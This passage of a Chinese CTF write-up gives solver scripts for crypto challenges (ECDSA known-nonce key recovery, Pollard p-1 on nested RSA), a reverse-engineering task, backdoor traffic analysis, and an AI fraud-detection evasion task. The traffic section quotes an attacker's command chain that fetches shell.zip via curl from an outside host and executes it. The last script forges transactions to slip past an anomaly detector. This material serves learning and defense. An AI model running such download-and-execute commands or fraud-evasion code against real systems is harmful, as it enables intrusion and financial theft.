    # 对应毫秒级时间戳
    t_start = 1766332800000 
    t_end   = 1766354400000 

    print(f"[*] Starting Deep Scan: {t_start} -> {t_end}")

    # 开始暴力计算
    for t_ms in range(t_start, t_end):
        # 1. 模拟 authenticate 内部字符串拼接
        auth_msg = f'{{"username":"{USER}","password":"{pass_b64}"}}'.encode()
        
        # 2. 生成魔改 HMAC
        sig_raw = modified_hmac(str(t_ms).encode(), auth_msg)
        sig_final = custom_b64(sig_raw)
        
        # 3. 构造最终 JSON 对象字符串
        # 模拟 JS 的 JSON.stringify，确保没有多余空格
        final_json = f'{{"username":"{USER}","password":"{pass_b64}","signature":"{sig_final}"}}'
        
        # 4. 计算验证 MD5
        res_md5 = hashlib.md5(final_json.encode()).hexdigest()

        if res_md5.startswith(GOAL_PREFIX):
            print("\n" + "#"*40)
            print(f"[!] FOUND MATCHING TIMESTAMP: {t_ms}")
            print(f"[!] FINAL MD5: {res_md5}")
            print(f"[!] SUBMIT: flag{{{res_md5}}}")
            print("#"*40)
            return

        # 进度指示
        if t_ms % 100000 == 0:
            print(f"[*] Searching... Current: {t_ms}", end='\r')

    print("\n[-] Range exhausted. No matches.")

if __name__ == "__main__":
    solve()
```

![](https://cdn.nlark.com/yuque/0/2025/png/60713757/1766918922672-0003741c-12c8-400a-8eb9-c384db257dcc.png)

##### flag值：
flag{ccaf33e3512e31f36228f0b97ccbc8f1}

<font style="color:#a6a6a6;"></font>

### 密码学1 ECDSA
#### 操作内容：
<font style="color:rgb(26, 28, 30);">ECDSA签名，题目给出了生成私钥和签名的脚本和一组签名数据，私钥是由固定字符串 </font><font style="color:rgb(50, 48, 44);">Welcome to this challenge!</font><font style="color:rgb(26, 28, 30);"> 的 SHA512 值决定的，编写解密脚本</font>

```python
import hashlib
from ecdsa import NIST521p
from Crypto.Util.number import long_to_bytes, inverse

# 1. 基础参数设置
curve = NIST521p
n = curve.order
# 题目中给出的第一个签名数据 (message-0)
msg0 = b"message-\x00"
# 从 signatures.txt 提取的第一行签名的 hex 部分
sig0_hex = "01a76ff5e0a4490f314ab2a0650d4e9d6955fb154c39eeec2700fefac7b4aeef1230142b1466809d30bc61f32d9ce44757b604b09e211753032c28b64ef9327db44d00c9545bcb3def28828a7424c03d5b688b7ea0581372d9efc417724ab6624244dae9283789a7d7a2f8c2f820fc032dec0c3c2363f2b759e81248f75110344cd13c26"

# 2. 解析签名 r, s
# NIST521p 签名长度为 132 字节 (264 hex 字符)，r 和 s 各占 66 字节 (132 hex 字符)
r_hex = sig0_hex[:132]
s_hex = sig0_hex[132:]
r = int(r_hex, 16)
s = int(s_hex, 16)

# 3. 计算消息哈希 z
# 源码逻辑: digest_int = int.from_bytes(sha512(msg).digest(), "big")
h = hashlib.sha512(msg0).digest()
z = int.from_bytes(h, "big")

# 4. 计算随机数 k (Known Nonce)
# 源码逻辑: seed = sha512(b"bias" + bytes([i])).digest()
# 对于 message-0, i=0
seed = hashlib.sha512(b"bias" + bytes([0])).digest()
k = int.from_bytes(seed, "big")

# 5. 恢复私钥 d
# 公式: d = r^(-1) * (s * k - z) mod n
r_inv = inverse(r, n)
d = (r_inv * (s * k - z)) % n

print(f"Recovered Private Key (int): {d}")

# 6. 计算 Flag
# flag{私钥的MD5值}
# 源码中私钥转bytes使用了: priv_bytes = long_to_bytes(priv_int, 66)
priv_bytes = long_to_bytes(d, 66) # NIST521p 对应 66 字节
flag_hash = hashlib.md5(priv_bytes).hexdigest()

print(f"Flag: flag{{{flag_hash}}}")
```

#### flag值：
flag{58c5c8f9929761652425b4b5b68c7fa7}

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766913828361-944cd7b2-07bd-470a-8e1e-23c593323636.png)

### 密码学2 EzFlag
#### 操作内容：
附件用IDA-PRO打开后shift+f12查看Strings，找关键字

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766919442351-e5bd7dfe-2938-4115-b568-d9f75be34939.png)

查看main函数发现flag是程序内部通过计算得出

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766920040518-956ef5a2-eb38-47eb-9f5a-beea7d537250.png)

看到012ab9c3478d56ef为字符表K  

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766920200164-bf4478b4-ab70-4055-8476-6abc23bb019c.png)

编写解密脚本

```python
# 模拟 C++ 的 uint64_t 溢出
MAX_UINT64 = 1 << 64

def to_uint64(x):
    """模拟 uint64_t 溢出"""
    return x % MAX_UINT64

# 快速计算 Fibonacci(n) mod m
def fibonacci_mod(n, m=16):
    def fast_double(k):
        if k == 0:
            return (0, 1)
        f_k, f_k1 = fast_double(k >> 1)
        f_2k = (f_k * ((2 * f_k1 - f_k) % m)) % m
        f_2k1 = (f_k * f_k + f_k1 * f_k1) % m
        if k & 1:
            return (f_2k1, (f_2k + f_2k1) % m)
        else:
            return (f_2k, f_2k1)
    return fast_double(n)[0] % m

# 映射表
MAP_CHARS = "012ab9c3478d56ef"

current_seed = 1
result = []

for idx in range(32):
    fib_index = fibonacci_mod(current_seed, 16)
    result.append(MAP_CHARS[fib_index])

    # UUID 风格的分隔符
    if idx in (7, 12, 17, 22):
        result.append('-')

    # 更新种子
    current_seed = to_uint64((current_seed << 3) + (idx + 0x40))

print("flag{" + "".join(result) + "}")

```

#### flag值：
flag{10632674-1d219-09f29-14769-f60219a24}

### 密码学3 RSA_NestingDoll
#### 操作内容：
嵌套RSA和平滑素数结构，嵌套使用素因子并构造光滑数，会直接被Pollard p−1攻击破解，Pollard p−1 分解 outer 模数，由于 outer 素数满足 p−1p-1p−1 光滑，使用 Pollard p−1 算法可以快速分解 nnn，然后由 outer 反推 inner 素因子，对每个 outer 素数 ppp，计算恢复 inner 的四个素因子，然后解inner RSA，计算得到私钥 ddd，解密密文恢复 flag，解密脚本如下

```python
import sys
import random
from math import gcd

# 配置
sys.setrecursionlimit(2000)
try:
    # 针对 Python 3.11+ 的大数转换限制解除
    sys.set_int_max_str_digits(100000)
except:
    pass

# 尝试导入 gmpy2
try:
    from gmpy2 import mpz, is_prime, invert, powmod
    def to_int(x): return int(x)
    print("[+] Using gmpy2.")
except ImportError:
    print("[!] gmpy2 not found. Using standard python math.")
    mpz = int
    to_int = int
    def powmod(a, b, m): return pow(a, b, m)
    def invert(a, m): return pow(a, -1, m)
    def is_prime(n):
        if n < 2: return False
        if n == 2 or n == 3: return True
        if n % 2 == 0: return False
        r, d = 0, n - 1
        while d % 2 == 0:
            r += 1
            d //= 2
        for a in [2, 3, 5, 7, 11, 13, 17, 19, 23]:
            if n <= a: break
            x = pow(a, d, n)
            if x == 1 or x == n - 1: continue
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1: break
            else:
                return False
        return True

# --- 数据 ---
n1_str = "16141229822582999941795528434053604024130834376743380417543848154510567941426284503974843508505293632858944676904777719167211264225017879544879766461905421764911145115313698529148118556481569662427943129906246669392285465962009760415398277861235401144473728421924300182818519451863668543279964773812681294700932779276119980976088388578080667457572761731749115242478798767995746571783659904107470270861418250270529189065684265364754871076595202944616294213418165898411332609375456093386942710433731450591144173543437880652898520275020008888364820928962186107055633582315448537508963579549702813766809204496344017389879"
n_outer_str = "484831124108275939341366810506193994531550055695853253298115538101629337644848848341479419438032232339003236906071864005366050185096955712484824249228197577223248353640366078747360090084446361275032026781246854700074896711976487694783856878403247312312487197243272330518861346981470353394149785086635163868023866817552387681890963052199983782800993485245670437818180617561464964987316161927118605512017355921555464359512280368738197370963036482455976503266489446554327046948670215814974461717020804892983665655107351050779151227099827044949961517305345415735355361979690945791766389892262659146088374064423340675969505766640604405056526597458482705651442368165084488267428304515239897907407899916127394598273176618290300112450670040922567688605072749116061905175316975711341960774150260004939250949738836358264952590189482518415728072191137713935386026127881564386427069721229262845412925923228235712893710368875996153516581760868562584742909664286792076869106489090142359608727406720798822550560161176676501888507397207863998129261472631954482761264406483807145805232317147769145985955267206369675711834485845321043623959730914679051434102698588945009836642922614296598336035078421463808774940679339890140690147375340294139027290793"
ct_str = "657984921229942454933933403447729006306657607710326864301226455143743298424203173231485254106370042482797921667656700155904329772383820736458855765136793243316671212869426397954684784861721375098512569633961083815312918123032774700110069081262242921985864796328969423527821139281310369981972743866271594590344539579191695406770264993187783060116166611986577690957583312376226071223036478908520539670631359415937784254986105845218988574365136837803183282535335170744088822352494742132919629693849729766426397683869482842748401000853783134170305075124230522253670782186531697976487673160305610021244587265868919495629"


known_p = mpz("135688958085666204636622376874663606060623037984533127554949215373727873563467489694515897900072291984166610384751239950595038402004183706658277547464498952029614078086225311186822818493543473754253851434625753882109758955467109025977046916035650210512394432911014637466491327705680886113441168344937689638007")

n1 = mpz(n1_str)
n_outer = mpz(n_outer_str)
ct = mpz(ct_str)
e = 65537

def get_primes(limit):
    """Sieve"""
    print(f"[*] Generating sieving primes up to {limit}...")
    is_p = bytearray([1]) * limit
    for i in range(2, int(limit**0.5) + 1):
        if is_p[i]:
            is_p[i*i:limit:i] = bytearray([0]) * len(range(i*i, limit, i))
    return [i for i in range(2, limit) if is_p[i]]

def long_to_bytes(val):
    val = int(val)
    return val.to_bytes((val.bit_length() + 7) // 8, 'big')

def pollard_p1_worker(modulus, primes, known_n1):
    """
    Robust Pollard's p-1
    """
    print(f"[*] Starting Pollard's p-1 on {modulus.bit_length()} bit modulus...")
    
    # Base setup: a = 2^(n1) mod N
    # This clears the large p1, q1, etc factors immediately.
    base_val = 2
    
    current_pool = [modulus]
    final_primes = []
    
    # 如果列表为空，说明已经分解完了
    if modulus == 1: return []

    # Chunk size reduced to avoid overshooting GCD
    chunk_size = 100
    
    # Initialize base
    a = powmod(base_val, known_n1, modulus)
    
    for i in range(0, len(primes), chunk_size):
        chunk = primes[i : i + chunk_size]
        
        # Calculate exponent for this chunk
        E = mpz(1)
        for p in chunk:
            # Add small prime powers to handle multiplicity
            if p < 1000:
                p_pow = p
                while p_pow < 20000: # 稍微多乘几次
                    p_pow *= p
                E *= p_pow
            else:
                E *= p
        
        # Update base
        try:
            a = powmod(a, E, modulus) # 我们只关心是否对 current_pool 中的元素变为 1
        except:
            # 如果 modulus 已经完全分解，上面的 powmod 可能没意义，但我们是在 loop 外层维护 pool
            pass
        
        next_pool = []
        for comp in current_pool:
            # Check GCD
            # 注意：这里的 a 是 mod modulus 的，但我们需要计算 gcd(a-1, comp)
            # a mod modulus 也是 a mod comp
            g = gcd(to_int(a - 1), to_int(comp))
            
            if 1 < g < comp:
                print(f"[+] Split found at prime index {i}! GCD bits: {g.bit_length()}")
                parts = [mpz(g), mpz(comp // g)]
                for part in parts:
                    if is_prime(part):
                        if part not in final_primes:
                            final_primes.append(part)
                            print(f"    -> Found Prime: {str(part)[:30]}...")
                    else:
                        next_pool.append(part)
                
                # 如果发生了分裂，我们需要更新 a，使其对应新的模数吗？
                # 不一定，但为了效率，如果不更新，计算会越来越大 (如果 a 不取模)。
                # 不过这里 a 始终是 mod (原始 modulus)。没问题。
            
            elif g == comp and i < len(primes) - 1000:
                # 整个 comp 都被 cover 了，意味着 a^E = 1 mod comp
                # 如果 comp 是合数，说明我们未能分离它的因子。
                # 这种情况下，我们需要换一个 base 重新尝试分离这个 comp。
                # 但为了脚本简单，我们先标记，最后再处理，或者这里直接用随机 base 尝试一下？
                print(f"[!] Composite stuck (GCD == composite). Attempting emergency split...")
                # 紧急尝试：用随机 base 再跑一小段
                split_success = False
                for _ in range(5):
                    rand_base = random.randint(3, 10000)
                    rb = powmod(rand_base, known_n1, comp)
                    # 用当前积累的 chunks 快速跑一下？太慢。
                    # 简单尝试：只用当前 chunk 的 primes 看看能不能分
                    rb = powmod(rb, E, comp) 
                    g2 = gcd(to_int(rb - 1), to_int(comp))
                    if 1 < g2 < comp:
                         print(f"    -> Emergency split successful!")
                         p1, p2 = mpz(g2), mpz(comp//g2)
                         for part in [p1, p2]:
                             if is_prime(part): final_primes.append(part)
                             else: next_pool.append(part)
                         split_success = True
                         break
                if not split_success:
                    print("    -> Failed to split stuck composite. Keeping it.")
                    next_pool.append(comp)
            else:
                next_pool.append(comp)
        
        current_pool = next_pool
        
        # 检查是否找齐了
        # 我们知道 n_outer 剩余部分是 3 个因子（因为已经找到了 1 个）
        # 所以总共我们可能有 1个 composite 在 pool 里，或者分解出更多
        total_found = len(final_primes)
        if total_found == 3: # n_outer原本4个，已知1个，剩3个
            print("[+] Found all remaining factors!")
            break
            
        if i % 5000 == 0:
            print(f"\r[*] Progress: {i}/{len(primes)} primes. Found {total_found}/3 factors.", end="")

    return final_primes

def solve():
    print("[*] Reducing problem size using known factor...")
    if n_outer % known_p == 0:
        rem_n = n_outer // known_p
    else:
        print("[!] Known factor does not divide n_outer! Check input.")
        rem_n = n_outer # Fallback

    print(f"[*] Remaining modulus size: {rem_n.bit_length()} bits")
    
    # 生成素数
    smooth_limit = 2**20 + 50000 # 稍微增加一点范围
    primes = get_primes(smooth_limit)
    
    # 运行 Pollard p-1
    factors = pollard_p1_worker(rem_n, primes, n1)
    
    # 汇总所有因子
    all_factors = factors + [known_p]
    
    # 检查
    unique_factors = sorted(list(set(all_factors)))
    print(f"[*] Total unique factors found: {len(unique_factors)}")
    
    if len(unique_factors) < 4:
        print("[!] Warning: Still missing factors. Decryption will likely fail.")
        # 暴力尝试：如果只有 3 个，可能其中一个是 p*q？
        # 但我们假设 pollard 尽力了。
    
    # 恢复 n1 的因子
    print("[*] Recovering n1 factors...")
    factors_n1 = []
    for p in unique_factors:
        # p-1 = k * p1
        # p1 = gcd(p-1, n1)
        p1 = gcd(to_int(p - 1), to_int(n1))
        if 1 < p1 < n1:
            factors_n1.append(p1)
            print(f"    -> {p1}")
        else:
            print(f"    -> [!] Failed to extract sub-factor for {str(p)[:20]}...")

    if len(factors_n1) != 4:
        print("[!] Don't have 4 sub-factors. Trying unique...")
        factors_n1 = list(set(factors_n1))
    
    # Decrypt
    print("[*] Decrypting...")
    phi = 1
    for f in factors_n1:
        phi *= (f - 1)
    
    try:
        d = invert(e, phi)
        m = powmod(ct, d, n1)
        flag = long_to_bytes(m)
        print(f"\n[+] Flag: {flag}")
        print(f"[+] Decoded: {flag.decode(errors='ignore')}")
    except Exception as ex:
        print(f"[-] Decryption error: {ex}")

if __name__ == "__main__":
    solve()
```

#### flag值：
flag{fak3_r5a_0f_euler_ph1_of_RSA_040a2d35}

![](https://cdn.nlark.com/yuque/0/2025/png/58019926/1766916326878-e80fb6af-3df9-48f3-a90d-977619e38fd1.png)

### 流量分析1 SnakeBackdoor-1
#### 操作内容：
浏览流量，发现他在密码爆破，最后一次得到最终密码

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914620424-cc837bd0-37dc-420a-a539-85ae26a57c7e.png)

#### flag值：
flag{zxcvbnm123}



### 流量分析2 SnakeBackdoor-2
#### 操作内容：
发现他在ssti时候获取config

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914768518-0d1a4bb1-ee9f-4498-bd65-c32a8323027a.png)

往下翻发现html实体编码

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914800460-d0791e39-34f0-4641-b8b4-aa8fc1567889.png)

解码得到secret_key

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914893995-17f01152-25f6-4ab0-bb6b-a7198f9563ab.png)

#### flag值：
flag{c6242af0-6891-4510-8432-e1cdf051f160}



### 流量分析3 SnakeBackdoor-3
#### 操作内容：
发现可疑模板注入

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766914965429-86dfc5d2-e2cd-402d-a86a-cdcd3de8070c.png)

先base64解码分析，发现逻辑是先zlib加密->base64编码->逆序

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766915045835-5dfa0a67-b736-4623-9383-267da8c6f458.png)

逆向解码，多层嵌套，多次逆向，拿到rc4密钥

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766915132400-9a1479cc-3141-4ebb-bbb2-5e77d91a3cb2.png)

#### flag值：
flag{v1p3r_5tr1k3_k3y}



### 流量分析4 SnakeBackdoor-4
#### 操作内容：
继续向后翻找流量

依次rc4解密

id -> ls -al -> curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip -> unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip -> mv /tmp/shell /tmp/python3.13 -> chmod +x /tmp/python3.13 -> /tmp/python3.13

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766915457311-353c5cf7-8ce0-43d2-96ee-feef350b292a.png)

#### flag值：
flag{python3.13}



### 流量分析5 SnakeBackdoor-5
#### 操作内容：
根据

id -> ls -al -> curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip -> unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip -> mv /tmp/shell /tmp/python3.13 -> chmod +x /tmp/python3.13 -> /tmp/python3.13

这个流程，发现上传的shell压缩包密码就是nf2jd092jd01，解压后

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766917637686-ad091a66-6954-4d7f-8466-3ac81381acb2.png)

拖进ida分析，发现密钥生成逻辑

它会接收 C2 服务器返回的 4 bytes seed，使得 srand 初始化为随机数生成器后生成 4 个随机数，将这 4 个随机数按内存小端格式拼接为 16 bytes的密钥

找到他上传木马后接收的seed：34952046

使用Linux glibc

rand()，生成密钥ac46fb610b313b4f32fc642d8834b456

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766918779041-1fd3bad4-efac-4845-9277-94e8de1c0a02.png)

#### flag值：
flag{ac46fb610b313b4f32fc642d8834b456}

### AI2 The Silent Heist
#### 操作内容：
加载正常交易数据 public_ledger.csv 。

获取数据的均值和标准差，特别是交易金额 feat_0。

训练 Isolation Forest 模型 :

去掉 feat_0，只用 feat_1 到 feat_19。

使用 Isolation Forest 模型训练数据，检测正常数据的模式。

生成伪造数据

通过均值和标准差生成伪造数据。

确保生成的交易总金额超过 $2,000,000。

使用模型预测生成数据是否正常，直到数据通过模型检测。

发送数据

将生成的数据转为 CSV 格式，并在末尾加上 "EOF"。

通过 Socket 将数据发送到目标服务器。

提取 Flag

监听服务器响应，检查是否返回 flag或secret关键字。

![](https://cdn.nlark.com/yuque/0/2025/png/60714179/1766915873702-c0b91e82-a536-4d0a-9387-316ec0a6c210.png)

代码：

```plain
import socket
import random
import re

server_address, target_port = '59.110.23.115', 24579
avg_values = [353.366, 27.518, 93.724, 82.976, 45.799, 4.935, 14.347, 52.31, 12.346, 31.683, 40.114, 85.796, 10.647,
               83.303, 75.145, 19.831, 31.058, 43.04, 14.267, 29.505]
std_devs = [15.0, 1.5, 1.5, 1.5, 1.0, 1.2, 1.2, 1.0, 1.5, 1.5, 1.5, 1.5, 1.5, 1.5, 1.0, 1.5, 1.5, 1.5, 1.5, 1.0]


def create_random_data(count=5800):
    records, columns = [], [f"column_{i}" for i in range(20)]
    while len(records) < count:
        sample = [random.normalvariate(avg_values[i], std_devs[i]) for i in range(20)]
        distance = sum([((sample[i] - avg_values[i]) / std_devs[i]) ** 2 for i in range(20)])
        if distance < 18:
            records.append([round(value, 6) for value in sample])
    return columns, records


def run_task():
    columns, rows = create_random_data()
    estimated_value = sum(row[0] for row in rows)
    print(f"Estimated total value: ${estimated_value:,.2f}")

    data_string = ",".join(columns) + "\n" + "".join([",".join(map(str, row)) + "\n" for row in rows]) + "EOF\n"

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.settimeout(30)
            print(f"Connecting to {server_address}:{target_port}...")
            conn.connect((server_address, target_port))

            print(conn.recv(1024).decode(errors='ignore'))

            print("Sending data...")
            conn.sendall(data_string.encode())

            print("Waiting for server response...")
            server_response = ""
            keywords = ["flag", "secret"]

            while True:
                data = conn.recv(4096).decode(errors='ignore')
                if data:
                    server_response += data
                    print(data, end="")

                    if any(keyword in server_response.lower() for keyword in keywords):
                        print("\n[+] 找到关键字，退出...")
                        break
                        
                    if re.search(r'flag\{.*\}', server_response, re.IGNORECASE):
                        print("\n[+] 找到flag格式！")
                        break

                else:
                    print("\n[+] 没有数据返回，退出...")
                    break

    except socket.timeout:
        print("[!] 连接超时！")
    except ConnectionError:
        print("[!] 连接错误！")
    except Exception as e:
        print(f"[!] 发生错误: {e}")


if __name__ == "__main__":
    run_task()
```

#### flag值：
flag{c2e78c04-87b6-4898-bc7f-ec96a79a9f1a}





